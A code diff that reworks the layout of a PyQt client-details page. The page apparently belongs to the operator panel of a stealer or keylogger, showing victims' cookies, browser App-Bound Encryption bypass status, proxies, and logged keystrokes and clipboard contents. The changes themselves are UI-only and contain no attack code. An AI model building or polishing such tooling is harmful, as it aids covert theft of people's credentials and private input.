@@ -36,7 +36,7 @@ class ClientDetailsPage(QtWidgets.QWidget):
         self._tags_updating = False
         self._tag_icon_cache: dict[str, QtGui.QIcon] = {}
         self._tag_checks: dict[str, QtWidgets.QCheckBox] = {}
-        self._detail_label_width = 150
+        self._detail_label_width = 128
         self._proxy_check_worker: ProxyCheckWorker | None = None
 
         layout = QtWidgets.QVBoxLayout(self)
@@ -198,6 +198,7 @@ class ClientDetailsPage(QtWidgets.QWidget):
             self.activity_search.setPlaceholderText(self.i18n.t("activity_search_placeholder"))
             self.activity_refresh_btn.setText(self.i18n.t("activity_refresh"))
             self.activity_delete_all_btn.setText(self.i18n.t("activity_delete_all"))
+            self.activity_overflow_hint.setText("Horizontal scroll indicates hidden columns")
             self._update_activity_type_filter()
         if hasattr(self, "abe_title"):
             self.abe_title.setText(self.i18n.t("abe_status_title"))
@@ -227,9 +228,12 @@ class ClientDetailsPage(QtWidgets.QWidget):
         self._update_view()
 
     def _build_main_tab(self) -> None:
-        layout = QtWidgets.QHBoxLayout(self.main_tab)
-        layout.setSpacing(16)
+        layout = QtWidgets.QVBoxLayout(self.main_tab)
+        layout.setSpacing(0)
         layout.setContentsMargins(0, 0, 0, 0)
+
+        self.main_splitter = QtWidgets.QSplitter(QtCore.Qt.Orientation.Horizontal)
+        self.main_splitter.setHandleWidth(8)
 
         self.client_info_card = GlassFrame(radius=20, tone="card", tint_alpha=170, border_alpha=70)
         self.client_info_card.setObjectName("Card")
@@ -261,7 +265,11 @@ class ClientDetailsPage(QtWidgets.QWidget):
         status_row.setSpacing(self.client_info_form.horizontalSpacing())
         self.work_status_label = QtWidgets.QLabel()
         self.work_status_label.setObjectName("DetailLabel")
-        self.work_status_label.setFixedWidth(self._detail_label_width)
+        self.work_status_label.setMinimumWidth(self._detail_label_width)
+        self.work_status_label.setSizePolicy(
+            QtWidgets.QSizePolicy.Policy.Fixed,
+            QtWidgets.QSizePolicy.Policy.Preferred,
+        )
         self.work_status_combo = QtWidgets.QComboBox()
         self.work_status_combo.setObjectName("StatusSelect")
         self.work_status_combo.setMinimumWidth(150)
@@ -281,8 +289,8 @@ class ClientDetailsPage(QtWidgets.QWidget):
         self.tags_area.setHorizontalScrollBarPolicy(
             QtCore.Qt.ScrollBarPolicy.ScrollBarAlwaysOff
         )
-        self.tags_area.setMinimumHeight(150)
-        self.tags_area.setMaximumHeight(150)
+        self.tags_area.setMinimumHeight(120)
+        self.tags_area.setMaximumHeight(250)
         self.tags_container = QtWidgets.QWidget()
         self.tags_container.setObjectName("TagContainer")
         self.tags_layout = QtWidgets.QVBoxLayout(self.tags_container)
@@ -324,10 +332,11 @@ class ClientDetailsPage(QtWidgets.QWidget):
         system_layout.addLayout(self.system_info_form)
         system_layout.addStretch()
 
-        layout.addWidget(self.client_info_card, 1)
-        layout.addWidget(self.system_info_card, 1)
-        layout.setAlignment(self.client_info_card, QtCore.Qt.AlignmentFlag.AlignTop)
-        layout.setAlignment(self.system_info_card, QtCore.Qt.AlignmentFlag.AlignTop)
+        self.main_splitter.addWidget(self.client_info_card)
+        self.main_splitter.addWidget(self.system_info_card)
+        self.main_splitter.setStretchFactor(0, 3)
+        self.main_splitter.setStretchFactor(1, 2)
+        layout.addWidget(self.main_splitter, 1)
 
     def _build_cookies_tab(self) -> None:
         layout = QtWidgets.QVBoxLayout(self.cookies_tab)
@@ -337,7 +346,7 @@ class ClientDetailsPage(QtWidgets.QWidget):
         card_layout = QtWidgets.QVBoxLayout(self.cookies_card)
         card_layout.setContentsMargins(14, 14, 14, 14)
         self.cookies_title = QtWidgets.QLabel()
-        self.cookies_title.setStyleSheet("font-weight: 600;")
+        self.cookies_title.setObjectName("CardSectionTitle")
         card_layout.addWidget(self.cookies_title)
         self.cookie_buttons_layout = QtWidgets.QGridLayout()
         self.cookie_buttons_layout.setHorizontalSpacing(8)
@@ -351,7 +360,7 @@ class ClientDetailsPage(QtWidgets.QWidget):
         abe_layout = QtWidgets.QVBoxLayout(self.abe_card)
         abe_layout.setContentsMargins(14, 14, 14, 14)
         self.abe_title = QtWidgets.QLabel()
-        self.abe_title.setStyleSheet("font-weight: 600;")
+        self.abe_title.setObjectName("CardSectionTitle")
         abe_layout.addWidget(self.abe_title)
 
         self.abe_form = QtWidgets.QFormLayout()
@@ -362,7 +371,11 @@ class ClientDetailsPage(QtWidgets.QWidget):
 
         self.abe_status_label = QtWidgets.QLabel()
         self.abe_status_label.setObjectName("DetailLabel")
-        self.abe_status_label.setFixedWidth(self._detail_label_width)
+        self.abe_status_label.setMinimumWidth(self._detail_label_width)
+        self.abe_status_label.setSizePolicy(
+            QtWidgets.QSizePolicy.Policy.Fixed,
+            QtWidgets.QSizePolicy.Policy.Preferred,
+        )
         self.abe_status_value = QtWidgets.QWidget()
         status_layout = QtWidgets.QHBoxLayout(self.abe_status_value)
         status_layout.setContentsMargins(0, 0, 0, 0)
@@ -378,14 +391,22 @@ class ClientDetailsPage(QtWidgets.QWidget):
 
         self.abe_method_label = QtWidgets.QLabel()
         self.abe_method_label.setObjectName("DetailLabel")
-        self.abe_method_label.setFixedWidth(self._detail_label_width)
+        self.abe_method_label.setMinimumWidth(self._detail_label_width)
+        self.abe_method_label.setSizePolicy(
+            QtWidgets.QSizePolicy.Policy.Fixed,
+            QtWidgets.QSizePolicy.Policy.Preferred,
+        )
         self.abe_method_value = QtWidgets.QLabel()
         self.abe_method_value.setObjectName("DetailValue")
         self.abe_form.addRow(self.abe_method_label, self.abe_method_value)
 
         self.abe_version_label = QtWidgets.QLabel()
         self.abe_version_label.setObjectName("DetailLabel")
-        self.abe_version_label.setFixedWidth(self._detail_label_width)
+        self.abe_version_label.setMinimumWidth(self._detail_label_width)
+        self.abe_version_label.setSizePolicy(
+            QtWidgets.QSizePolicy.Policy.Fixed,
+            QtWidgets.QSizePolicy.Policy.Preferred,
+        )
         self.abe_version_value = QtWidgets.QLabel()
         self.abe_version_value.setObjectName("DetailValue")
         self.abe_form.addRow(self.abe_version_label, self.abe_version_value)
@@ -412,7 +433,7 @@ class ClientDetailsPage(QtWidgets.QWidget):
         features_layout.setSpacing(8)
 
         self.abe_features_title = QtWidgets.QLabel()
-        self.abe_features_title.setStyleSheet("font-weight: 600;")
+        self.abe_features_title.setObjectName("CardSectionTitle")
         features_layout.addWidget(self.abe_features_title)
 
         self.abe_feature_items: dict[str, tuple[QtWidgets.QLabel, QtWidgets.QLabel]] = {}
@@ -455,7 +476,8 @@ class ClientDetailsPage(QtWidgets.QWidget):
 
         # Limitations section
         self.abe_limitations_label = QtWidgets.QLabel()
-        self.abe_limitations_label.setStyleSheet("font-weight: 600; margin-top: 8px;")
+        self.abe_limitations_label.setObjectName("CardSectionTitle")
+        self.abe_limitations_label.setContentsMargins(0, 8, 0, 0)
         features_layout.addWidget(self.abe_limitations_label)
 
         self.abe_limitations_list = QtWidgets.QLabel()
@@ -474,7 +496,7 @@ class ClientDetailsPage(QtWidgets.QWidget):
         card_layout = QtWidgets.QVBoxLayout(self.proxy_card)
         card_layout.setContentsMargins(14, 14, 14, 14)
         self.proxy_title = QtWidgets.QLabel()
-        self.proxy_title.setStyleSheet("font-weight: 600;")
+        self.proxy_title.setObjectName("CardSectionTitle")
         self.proxy_body = QtWidgets.QLabel()
         self.proxy_body.setObjectName("Muted")
         self.proxy_body.setWordWrap(True)
@@ -774,7 +796,7 @@ class ClientDetailsPage(QtWidgets.QWidget):
         card_layout = QtWidgets.QVBoxLayout(self.storage_card)
         card_layout.setContentsMargins(14, 14, 14, 14)
         self.storage_title = QtWidgets.QLabel()
-        self.storage_title.setStyleSheet("font-weight: 600;")
+        self.storage_title.setObjectName("CardSectionTitle")
         self.storage_body = QtWidgets.QLabel()
         self.storage_body.setObjectName("Muted")
         self.storage_body.setWordWrap(True)
@@ -800,7 +822,7 @@ class ClientDetailsPage(QtWidgets.QWidget):
         # Title row
         title_row = QtWidgets.QHBoxLayout()
         self.activity_title = QtWidgets.QLabel()
-        self.activity_title.setStyleSheet("font-weight: 600; font-size: 14px;")
+        self.activity_title.setObjectName("CardSectionTitle")
         title_row.addWidget(self.activity_title)
         title_row.addStretch()
         
@@ -816,19 +838,23 @@ class ClientDetailsPage(QtWidgets.QWidget):
 
         # Search input
         self.activity_search = QtWidgets.QLineEdit()
-        self.activity_search.setMinimumWidth(200)
+        self.activity_search.setMinimumWidth(180)
+        self.activity_search.setSizePolicy(
+            QtWidgets.QSizePolicy.Policy.Expanding,
+            QtWidgets.QSizePolicy.Policy.Fixed,
+        )
         self.activity_search.textChanged.connect(self._on_activity_search_changed)
         filter_row.addWidget(self.activity_search)
 
         # Type filter dropdown
         self.activity_type_filter = QtWidgets.QComboBox()
-        self.activity_type_filter.setMinimumWidth(120)
+        self.activity_type_filter.setMinimumWidth(140)
         self.activity_type_filter.currentIndexChanged.connect(self._on_activity_filter_changed)
         filter_row.addWidget(self.activity_type_filter)
 
         # Application filter dropdown
         self.activity_app_filter = QtWidgets.QComboBox()
-        self.activity_app_filter.setMinimumWidth(150)
+        self.activity_app_filter.setMinimumWidth(170)
         self.activity_app_filter.currentIndexChanged.connect(self._on_activity_filter_changed)
         filter_row.addWidget(self.activity_app_filter)
 
@@ -861,6 +887,9 @@ class ClientDetailsPage(QtWidgets.QWidget):
         self.activity_table.setAlternatingRowColors(True)
         self.activity_table.verticalHeader().setVisible(False)
         self.activity_table.setEditTriggers(QtWidgets.QAbstractItemView.EditTrigger.NoEditTriggers)
+        self.activity_table.setHorizontalScrollBarPolicy(QtCore.Qt.ScrollBarPolicy.ScrollBarAsNeeded)
+        self.activity_table.setVerticalScrollBarPolicy(QtCore.Qt.ScrollBarPolicy.ScrollBarAsNeeded)
+        self.activity_table.verticalHeader().setDefaultSectionSize(38)
         
         # Column widths
         header_view = self.activity_table.horizontalHeader()
@@ -871,6 +900,9 @@ class ClientDetailsPage(QtWidgets.QWidget):
         header_view.setSectionResizeMode(4, QtWidgets.QHeaderView.ResizeMode.ResizeToContents)
         
         layout.addWidget(self.activity_table, 1)
+        self.activity_overflow_hint = QtWidgets.QLabel("Horizontal scroll indicates hidden columns")
+        self.activity_overflow_hint.setObjectName("TableOverflowHint")
+        layout.addWidget(self.activity_overflow_hint)
 
         # Load more button
         self.activity_load_more_btn = make_button(self.i18n.t("activity_load_more"), "ghost")
@@ -1045,7 +1077,11 @@ class ClientDetailsPage(QtWidgets.QWidget):
 
             # Type
             entry_type = log.get("entry_type", "keystroke")
-            type_text = "📋" if entry_type == "clipboard" else "⌨️"
+            type_text = (
+                self.i18n.t("activity_filter_clipboard")
+                if entry_type == "clipboard"
+                else self.i18n.t("activity_filter_keystroke")
+            )
             self.activity_table.setItem(row, 4, QtWidgets.QTableWidgetItem(type_text))
 
         # Show load more if there are more logs
@@ -1174,7 +1210,7 @@ class ClientDetailsPage(QtWidgets.QWidget):
             row = self.client_info_form.rowCount()
             label_widget = QtWidgets.QLabel(label)
             label_widget.setObjectName("DetailLabel")
-            label_widget.setFixedWidth(self._detail_label_width)
+            label_widget.setMinimumWidth(self._detail_label_width)
             label_widget.setSizePolicy(
                 QtWidgets.QSizePolicy.Policy.Fixed,
                 QtWidgets.QSizePolicy.Policy.Preferred,
@@ -1313,7 +1349,7 @@ class ClientDetailsPage(QtWidgets.QWidget):
             row = self.system_info_form.rowCount()
             label_widget = QtWidgets.QLabel(label)
             label_widget.setObjectName("DetailLabel")
-            label_widget.setFixedWidth(self._detail_label_width)
+            label_widget.setMinimumWidth(self._detail_label_width)
             label_widget.setSizePolicy(
                 QtWidgets.QSizePolicy.Policy.Fixed,
                 QtWidgets.QSizePolicy.Policy.Preferred,
@@ -1688,6 +1724,18 @@ class ClientDetailsPage(QtWidgets.QWidget):
         layout.addStretch()
         return row
 
+    def resizeEvent(self, event: QtGui.QResizeEvent) -> None:
+        super().resizeEvent(event)
+        if not hasattr(self, "main_splitter"):
+            return
+        orientation = (
+            QtCore.Qt.Orientation.Vertical
+            if self.width() < 1240
+            else QtCore.Qt.Orientation.Horizontal
+        )
+        if self.main_splitter.orientation() != orientation:
+            self.main_splitter.setOrientation(orientation)
+
     @staticmethod
     def _clear_layout(layout: QtWidgets.QLayout) -> None:
         while layout.count():
@@ -1697,3 +1745,4 @@ class ClientDetailsPage(QtWidgets.QWidget):
             widget = item.widget()
             if widget is not None:
                 widget.setParent(None)
+
